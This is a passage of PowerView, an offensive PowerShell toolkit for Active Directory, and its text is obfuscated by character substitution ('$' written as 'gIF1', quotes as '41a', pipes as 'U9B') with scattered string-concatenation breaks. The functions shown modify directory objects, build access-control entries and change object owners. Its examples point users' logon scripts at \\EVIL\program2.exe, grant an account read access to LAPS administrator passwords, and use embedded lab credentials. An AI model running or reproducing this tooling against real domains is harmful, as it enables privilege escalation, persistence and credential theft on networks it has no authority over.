            gIF1PropertyFilter = gIF1PSBoundParameters[41aProperties41a] -Join 41aU9B41a
        }
        else {
            gIF1PropertyFilter = '+'41a41a
        }
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aIdentity41a]) { gIF1SearcherArguments[41aIdentity41a] = gIF1Identity }

        Get-DomainObject @SearcherArguments U9B ForEach-Object {
            gIF1ObjectDN = gIF1_.Properties[41adistinguishedname41a][0]
            ForEach(gIF1XMLNode in gIF1_.Properties[41amsds-replvaluemetadata41a]) {
                gIF1TempObject = [xml]gIF1XMLNode U9B Select-Object -ExpandProperty 41aDS_REPL_VALUE_META_DATA41a -ErrorAction SilentlyContinue
                if (gIF1TempObject) {
                    if (gIF1TempObject.pszAttributeName -Match gIF1PropertyFilter) {
                        gIF1Output = New-Object PSObject
                        gIF1Output U9B Add-Member NoteProperty 41aObjectDN41a gIF1ObjectDN
                        gIF1Output U9B Add-Member NoteProperty 41aAttributeName41a gIF1TempObject.pszAttributeName
                        gIF1Output U9B Add-Member NoteProperty 41aAttributeValue41a gIF1TempObject.pszObjectDn
                        gIF1Output U9B Add-Member NoteProperty 41aTimeCreated41a gIF1TempObject.ftimeCreated
                        gIF1Output U9B Add-Member NoteProperty 41aTimeDeleted41a gIF1TempObject.ftimeDeleted
                        gIF1Output U9B Add-Member NoteProperty 41aLastOriginatingChange41a gIF1TempObject.ftimeLastOriginatingChange
                        gIF1Output U9B Add-Member NoteProperty 41aVersion41a gIF1TempObject.dwVersion
                        gIF1Output U9B Add-Member NoteProperty 41aLastOriginatingDsaDN41a gIF1TempObject.pszLastOriginatingDsaDN
                        gIF1Output.PSObject.TypeNames.Insert(0, 41aPowerView.ADObjectLinkedAttributeHistory41a)
                        gIF1Output
                    }
                }
                else {
                    Write-Verbose Zfr[Get-DomainObjectLinkedAttributeHistory] Error retrieving 41amsds-replvaluemetadata41a for 41agIF1ObjectDN41aZfr
                }
            }
        }
    }
}


function Set-DomainObject {
<#
.SYNOPSIS

Modifies a gven property for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Splats user/object targeting parameters to Get-DomainObject, returning the raw
searchresult object. Retrieves the raw directoryentry for the object, and sets
any values from -Set @{}, XORs any values from -XOR @{}, and clears any values
from -Clear @().

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Set

Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.

.PARAMETER XOR

Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.

.PARAMETER Clear

Specifies an array of object properties that will be cleared in the directory.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObject testuser -Set @{41amstsinitialprogram41a=41aYwWYwWEVILYwWprogram.exe41a} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(U9B(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to YwWYwWEVILYwWprogram.exe for object test'+'user

.EXAMPLE

ZfrS-1-5-21-890171859-3433809279-3366196753-1108Zfr,ZfrtestuserZfr U9B Set-DomainObject -Set @{41acountrycode41a=1234; 41amstsinitialprogram41a=41aYwWYwWEVILYwWprogram2.exe41a} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string:
(&(U9B(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))
VERBOSE: Setting mstsinitialprogram to YwWYwWEVILYwWprogram2.exe for object harmj0y
VERBOSE: Setting countrycode to 1234 for object harmj0y
VERBOSE: Get-DomainSearcher search string:
LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(U9B(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to YwWYwWEVILYwWprogram2.exe for object testuser
VERBOSE: Setting countrycode to 1234 for object testuser

.EXAMPLE

ZfrS-1-5-21-890171859-3433809279-3366196753-1108Zfr,ZfrtestuserZfr U9B Set-DomainObject -Clear department -Verbose

Cleares the 41adepartment41a field for both object identities.

.EXAMPLE

Get-DomainUser testuser U9B ConvertFrom-UACValue -Verbose

Name                           Value
--'+'--                           -----
NORMAL_ACCOUNT                 512


Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(U9B(samAccountName=testuser)))
VERBOSE: XORing 41auseraccountcontrol41a with 41a6553641a for object 41atestuser41a

Get-DomainUser testuser U9B ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
YwWYwWprimaryYwWsysvolYwWblah.ps1

gIF1SecPassword = ConvertTo-SecureString 41a'+'Password123!41a-AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1Sec'+'Pa'+'ssword)
Set-DomainObject -Identity testuser -Set @{41ascriptpath41a=41aYwWYwWEVILYwWprogram2.exe41a} -Credential gIF1Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 41aTESTLAB41a from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(U9B(U9B(samAccountName=testuser)(name=testuser))))
VERBOSE: [Set-DomainObject] Setting 41ascriptpath41a to 41aYwWYwWEVILYwWprogram2.exe41a for object 41atestuser41a

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
YwWYwWEVILYwWprogram2.exe
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseShouldProcessForStateChangingFunctions41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [CmdletBinding()]
    Param(
        [Par'+'ameter(Position = 0, Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [Alias(41aReplace41a)]
        [Hashtable]
        gIF1Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        gIF1XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredent'+'ial]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments = @{41aRaw41a = gIF1True}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1SearcherArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aIdentity41a]) { gIF1SearcherArguments[41aIdentity41a] = gIF1Identity }

        # splat the appropriate arguments to Get-DomainObject
        '+'gIF1RawObject = Get-DomainObject @SearcherArguments

        ForEach (gIF1Object in gIF1RawObject) {

            gIF1Ent'+'ry = gIF1RawObject.GetDirectoryEntry()

            if(gIF1PSBoundParameters[41aSet41a]) {
                try {
                    gIF1PSBoundParameters[41aSet41a].GetEnumerator() U9B ForEach-Object {
                        Write-Verbose Zfr[Set-DomainObject] Setting 41agIF1(gIF1_.Name)41a '+'to 41agIF1(gIF1_.Value)41a for object 41agIF1(gIF1RawObject.Properties.samaccountname)41aZfr
                        gIF1Entry.put(gIF1_.Name, gIF1_.Value)
                    }
                    gIF1Entry.commitchanges()
                }
                catch {
                    Write-Warning Zfr[Set-DomainObject] Error setting/replacing properties for object 41agIF1(gIF1RawObject.Properties.samaccountname)41a : gIF1_Zfr
                }
            }
            if(gIF1PSBoundParameters[41aXOR41a]) {
                try {
                    gIF1PSBoundParameters[41aXOR41a].GetEnumerator() U9B ForEach-Object {
                        gIF1PropertyName = gIF1_.Name
                        gIF1PropertyXorValue = gIF1_.Value
                        Write-Verbose Zfr[Set-DomainObject] XORing 41agIF1PropertyName41a with 41agIF1PropertyXorValue41a for object 41agIF1(gIF1RawObject.Properties.samaccountname)41aZfr
                        gIF1TypeName = gIF1Entry.gIF1PropertyName[0].GetType().name

                        # UAC value references- https://support.microsoft.com/en-us/kb/305144
                        gIF1PropertyValue = gIF1(gIF1Entry.gIF1PropertyName) -bxor gIF1PropertyXorValue
                        gIF1Entry.gIF1PropertyName = gIF1PropertyValue -as gIF1TypeName
                    }
                    gIF1Entry.commitchanges()
                }
                catch {
                    Write-Warning Zfr[Set-DomainObject] Error XOR41aing properties for object 41agIF1(gIF1RawObject.Properties.samaccountname)41a : gIF1_Zfr
                }
            }
            if(gIF1PSBoundParameters[41aClear41a]) {
                try {
                    gIF1PSBoundParameters[41aClear41a] U9B ForEach-Object {
                        gIF1PropertyName = gIF1_
                        Write-Verbose Zfr[Set-DomainObject] Clearing 41agIF1PropertyName41a for object 41agIF1(gIF1RawObject.Properties.samaccountname)41aZfr
                        gIF1Entry.gIF1PropertyName.clear()
                    }
                    gIF1Entry.commitchanges()
                }
                catch {
                    Write-Warning Zfr[Set-DomainObject] Error clearing properties for object 41agIF1(gIF1RawObject.Properties.samaccoun'+'tname)41a : gIF1_Zfr
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {
<#
.SYNOPSIS

Converts the LDAP LogonHours array to a processible object.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Converts the LDAP LogonHours array to a processible object.  Each entry
property in the output object corresponds to a day of the week and hour during
the day (in UTC) indicating whether or not the user can logon at the specified
hour.

.PARAMETER LogonHoursArray

21-byte LDAP hours array.

.EXAMPLE

gIF1'+'hours = (Get-DomainUser -LDAPFilter 41auserworkstations=*41a)[0].logonhours
ConvertFrom-LDAPLogonHours gIF1hours

Gets the logonhours array from the first AD user with logon restrictions.

.OUTPUTS

PowerView.LogonHours
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.LogonHours41a)]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        gIF1LogonHoursArray
    )

    Begin {
        if(gIF1LogonHoursArray.Count -ne 21) {
            throw ZfrLogonHoursArray is the incorrect lengthZfr
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                gIF1HoursArr
            )

            gIF1LogonHours = New-Object bool[] 24
            for(gIF1i=0; gIF1i -lt 3; gIF1i++) {
                gIF1Byte = gIF1HoursArr[gIF1i]
                gIF1Offset = gIF1i * 8
                gIF1Str = [Convert]::ToString(gIF1Byte,2).PadLeft(8,41a041a)

                gIF1LogonHours[gIF1Offset+0] = [bool] [convert]::ToInt32([string]gIF1Str[7])
                gIF1LogonHours[gIF1Offset+1] = [bool] [convert]::ToInt32([string]gIF1Str[6])
                gIF1LogonHours[gIF1Offset+2] = [bool] [convert]::ToInt32([string]gIF1Str[5])
                gIF1LogonHours[gIF1Offset+3] = [bool] [convert]::ToInt32([string]gIF1Str[4])
                gIF1LogonHours[gIF1Offset+4] = [bool] [convert]::ToInt32([string]gIF1Str[3])
                gIF1LogonHours[gIF1Offset+5] = [bool] [convert]::ToInt32([string]gIF1Str[2])
                gIF1LogonHours[gIF1Offset+6] = [bool] [convert]::ToInt32([string]gIF1Str[1])
                gIF1LogonHours[gIF1Offset+7] = [bool] [convert]::ToInt32([string]gIF1Str[0])
            }

            gIF1LogonHours
        }
    }

    Process {
        gIF1Output = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr gIF1LogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr gIF1LogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr gIF1LogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr gIF1LogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr gIF1LogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr gIF1LogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr gIF1LogonHoursArray[18..20]
        }

        gIF1Output = New-Object PSObject -Property gIF1Output
        gIF1Output.PSObject.TypeNames.Insert(0, 41aPowerView.LogonHours41a)
        gIF1Output
    }
}


function New-ADObjectAccessControlEntry {
<#
.SYNOPSIS

Creates a new Active Directory object-specific access control entry.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Creates a new object-specific access control entry (ACE).  The ACE could be 
used for auditing access to an object or controlling access to objects.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER PrincipalSearchBase

The LDAP source to search through for principals, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Right

Specifies the rights set on the Active D'+'irectory object.

.PARAMETER AccessControlType

Specifies the type of ACE (allow or deny)

.PARAMETER AuditFlag

For audit ACEs, specifies when to create an audit log (on success or failure)

.PARAMETER ObjectType

Specifies the GUID of the object that the ACE applies to.

.PARAMETER InheritanceType

Specifies how the ACE applies to the object and/or its children.

.PARAMETER InheritedObjectType

Specifies the type of object that can inherit the ACE.

.EXAMPLE

gIF1Guids = Get-DomainGUIDMap
gIF1AdmPropertyGuid = gIF1Guids.GetEnumerator() U9B ?{gIF1_.value -eq 41ams-Mcs-AdmPwd41a} U9B select -ExpandProperty name
gIF1CompPropertyGuid = gIF1Guids.GetEnumerator() U9B ?{gIF1_.value -eq 41aComputer41a} U9B select -ExpandProperty name
gIF1ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType gIF1AdmPropertyGuid -InheritanceType All -InheritedObjectType gIF1CompPropertyGuid
gIF1OU = Get-DomainOU -Raw Workstations
gIF1DsE'+'ntry = gIF1OU.GetDirectoryEntry()
gIF1dsEntry.PsBase.Options.SecurityMasks = 41aDacl41a
gIF1dsEntry.PsBase.ObjectSecurity.AddAccessRule(gIF1ACE)
gIF1dsEntry.PsBase.CommitChanges()

Adds an ACE to all computer objects in the OU ZfrWorkstationsZfr permitting the
user ZfritadminZfr to read the confidential ms-Mcs-AdmPwd computer property.

.OUTPUTS

System.Security.AccessControl.AuthorizationRule
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseShouldProcessForStateChangingFunctions41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aSystem.Security.AccessControl.AuthorizationRule41a)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True, Mandatory = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
        [String]
        gIF1PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet('+'41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = gIF1True)]
        [ValidateSet(41aAccessSystemSecurity41a, 41aCreateChild41a,41aDelete41a,41aDeleteChild41a,41aDeleteTree41a,41aExtendedRight41a,41aGenericAll41a,41aGenericExecute41a,41aGenericRead41a,41aGenericWrite41a,41aListChildren41a,41aListObject41a,41aReadControl41a,41aReadProperty41a,41aSelf41a,41aSynchronize41a,41aWriteDacl41a,41aWriteOwner41a,41aWriteProperty41a)]
        gIF1Right,

        [Parameter(Mandatory = gIF1True, ParameterSetName=41aAccessRuleType41a)]
        [ValidateSet(41aAllow41a, 41aDeny41a)]
        [String[]]
        gIF1AccessControlType,

        [Parameter(Mandatory = gIF1True, ParameterSetName=41aAuditRuleType41a)]
        [ValidateSet(41aSuccess41a, 41aFailure41a)]
        [String]
        gIF1AuditFlag,

        [Parameter(Mandatory = gIF1False, ParameterSetName=41aAccessRuleType41a)]
        [Parameter(Mandatory = gIF1False, ParameterSetName=41aAuditRuleType41a)]
        [Parameter(Mandatory = gIF1False, ParameterSetName=41aObjectGuidLookup41a)]
        [Guid]
        gIF1ObjectType,

        [ValidateSet(41aAll41a, 41aChildren41a,41aDescendents41a,41aNone41a,41aSelfAndChildren41a)]
        [String]
        gIF1InheritanceType,

        [Guid]
        gIF1InheritedObjectType
    )

    Begin {
        if (gIF1PrincipalIdentity -notmatch 41a^S-1-.*41a) {
            gIF1PrincipalSearcherArguments = @{
                41aIdentity41a = gIF1PrincipalIdentity
                41aProperties41a = 41adistinguishedname,objectsid41a
            }
            if (gIF1PSBoundParameters[41aPrincipalDomain41a]) { gIF1PrincipalSearcherArguments[41aDomain41a] = gIF1PrincipalDomain }
            if (gIF1PSBoundParameters[41aServer41a]) { gIF1PrincipalSearcherArguments[41aServer41a] = gIF1Server }
            if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1PrincipalSearcherArguments[41aSearchScope41a] = '+'gIF1SearchScope }
            if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1PrincipalSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
            if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1PrincipalSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
            if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1PrincipalSearcherArguments[41aTombstone41a] = gIF1Tombstone }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1PrincipalSearcherArguments[41aCredential41a] = gIF1Credential }
            gIF1Principal = Get-DomainObject @PrincipalSearcherArguments
            if (-not gIF1Principal) {
                throw ZfrUnable to resolve principal: gIF1PrincipalIdentityZfr
            }
            elseif(gIF1Principal.Count -gt 1) {
                throw ZfrPrincipalIdentity matches multiple AD objects, but only one is allowedZfr
            }
            gIF1ObjectSid = gIF1Principal.objectsid
        }
        else {
            gIF1ObjectSid = gIF1PrincipalIdentity
        }

        gIF1ADRight = 0
        foreach(gIF1r in gIF1Right) {
            gIF1ADRight = gIF1ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]gIF1'+'r).value__)
        }
        gIF1ADRight = [System.DirectoryServices.ActiveDirectoryRights]gIF1ADRight

        gIF1Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]gIF1ObjectSid)
    }

    Process {
        if(gIF1PSCmdlet.ParameterSetName -eq 41aAuditRuleType41a) {

            if(gIF1ObjectType -eq gIF1null -and gIF1InheritanceType -eq [String]::Empty -and gIF1InheritedObjectType -eq gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AuditFlag
            } elseif(gIF1ObjectType -eq gIF1null -and gIF1InheritanceType -ne [String]::Empty -and gIF1InheritedObjectType -eq gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]gIF1InheritanceType)
            } elseif(gIF1ObjectType -eq gIF1null -and gIF1InheritanceType -ne [String]::Empty -and gIF1InheritedObjectType -ne gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]gIF1InheritanceType), gIF1InheritedObjectType
            } elseif(gIF1ObjectType -ne gIF1null -and gIF1InheritanceType -eq [String]::Empty -and gIF1InheritedObjectType -eq gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AuditFlag, gIF1ObjectType
            } elseif(gIF1ObjectType -ne gIF1null -and gIF1InheritanceType -ne [String]::Empty -and gIF1InheritedObjectType -eq gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AuditFlag, gIF1ObjectType, gIF1InheritanceType
            } elseif(gIF1ObjectType -ne gIF1null -and gIF1InheritanceType -ne [String]::Empty -and gIF1InheritedObjectType -ne gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRu'+'le -ArgumentList gIF1Identity, gIF1ADRight, gIF1'+'AuditFlag, gIF1ObjectType, gIF1InheritanceType, gIF1InheritedObjectType
            }

        }
        else {

            if(gIF1ObjectType -eq gIF1null -and gIF1InheritanceType -eq [String]::Empty -and gIF1InheritedObjectType -eq gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AccessControlType
            } elseif(gIF1ObjectType -eq gIF1null -and gIF1InheritanceType -ne [String]::Empty -and gIF1InheritedObjectType -eq gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]gIF1InheritanceType)
            } elseif(gIF1ObjectType -eq gIF1null -and gIF1InheritanceType -ne [String]::Empty -and gIF1InheritedObjectType -ne gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAcce'+'ssRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]gIF1InheritanceType), gIF1InheritedObjectType
            } elseif(gIF1ObjectType -ne gIF1null -and gIF1InheritanceType -eq [String]::Empty -and gIF1InheritedObjectType -eq gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList gIF1Identity, g'+'IF1ADRight, gIF1AccessControlType, gIF1ObjectType
            } elseif(gIF1ObjectType -ne gIF1null -and gIF1InheritanceType -ne [String]::Empty -and gIF1InheritedObjectType -eq gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AccessControlType, gIF1ObjectType, gIF1InheritanceType
            } elseif(gIF1ObjectType -ne gIF1null -and gIF1InheritanceType -ne [String]::Empty -and gIF1InheritedObjectType -ne gIF1null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList gIF1Identity, gIF1ADRight, gIF1AccessControlType, gIF1ObjectType, gIF1InheritanceType, gIF1InheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {
<#
.SYNOPSIS

Modifies the owner for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Retrieves the Active Directory object specified by -Identity by splatting to
Get-DomainObject, returning the raw searchresult object. Retrieves the raw
directoryentry for the object, and sets the object owner to -OwnerIdentity.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the AD object to set the owner for.

.PARAMETER OwnerIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the owner to set for -Identity.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query s'+'tring that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain contro'+'ller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

Set the owner of 41adfm41a in the current domain to 41aharmj0y41a.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y -Credential gIF1Cred

Set the owner of 41adfm41a in the current domain to 41aharmj0y41a using the alternate credentials.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseShouldProcessForStateChangingFunctions41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
        [String]
        gIF1Identity,

